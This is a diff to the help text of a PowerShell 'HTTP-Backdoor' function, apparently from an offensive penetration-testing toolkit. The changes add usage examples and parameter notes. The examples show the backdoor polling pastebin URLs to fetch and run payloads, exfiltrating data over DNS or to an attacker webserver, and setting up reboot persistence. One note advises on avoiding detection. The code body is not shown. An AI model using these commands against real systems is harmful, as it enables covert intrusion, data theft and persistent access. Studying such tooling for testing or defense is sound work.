@@ -1,7 +1,4 @@
 
-
-
-
 function HTTP-Backdoor
 {
 <#
@@ -49,13 +46,15 @@ Password for the pastebin/gmail account where data would be exfiltrated.
 Unused for other options
 
 .PARAMETER URL
-The URL of the webserver where POST requests would be sent.
+The URL of the webserver where POST requests would be sent. The Webserver must beb able to log the POST requests.
+The encoded values from the webserver could be decoded bby using Invoke-Decode from Nishang.
 
 .PARAMETER DomainName
-The DomainName, whose subdomains would be used for sending TXT queries to.
+The DomainName, whose subdomains would be used for sending TXT queries to. The DNS Server must log the TXT queries.
 
 .PARAMETER AuthNS
-Authoritative Name Server for the domain specified in DomainName
+Authoritative Name Server for the domain specified in DomainName. Using it may increase chances of detection.
+Usually, you should let the Name Server of target to resolve things for you.
 
 .Example
 
@@ -64,20 +63,27 @@ PS > HTTP-Backdoor
 The payload will ask for all required options.
 
 .EXAMPLE
-PS > HTTP-Backdoor http://pastebin.com/raw.php?i=jqP2vJ3x http://pastebin.com/raw.php?i=Zhyf8rwh start123 stopthis
+PS > HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -MagicString start123 -StopString stopthis
 
 Use above when using the payload from non-interactive shells.
 
 .EXAMPLE
-PS > HTTP-Backdoor http://pastebin.com/raw.php?i=jqP2vJ3x http://pastebin.com/raw.php?i=Zhyf8rwh start123 stopthis -exfil -ExfilOption DNS -DomainName example.com -AuthNS <dns>
+PS > HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -MagicString start123 -StopString stopthis -exfil -ExfilOption DNS -DomainName example.com -AuthNS <dns>
 
 Use above command for using exfiltration methods.
 
 
 .EXAMPLE
-PS > HTTP-Backdoor -persist
+PS > HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -MagicString start123 -StopString stopthis -persist
 
 Use above for reboot persistence.
+
+.EXAMPLE
+PS > HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -MagicString start123 -StopString stopthis -ExfilOption WebServer http://resultwebserver -persist
+
+Use above command for using exfiltration methods and reboot persistence.
+
+
 
 .LINK
 http://labofapenetrationtester.com/
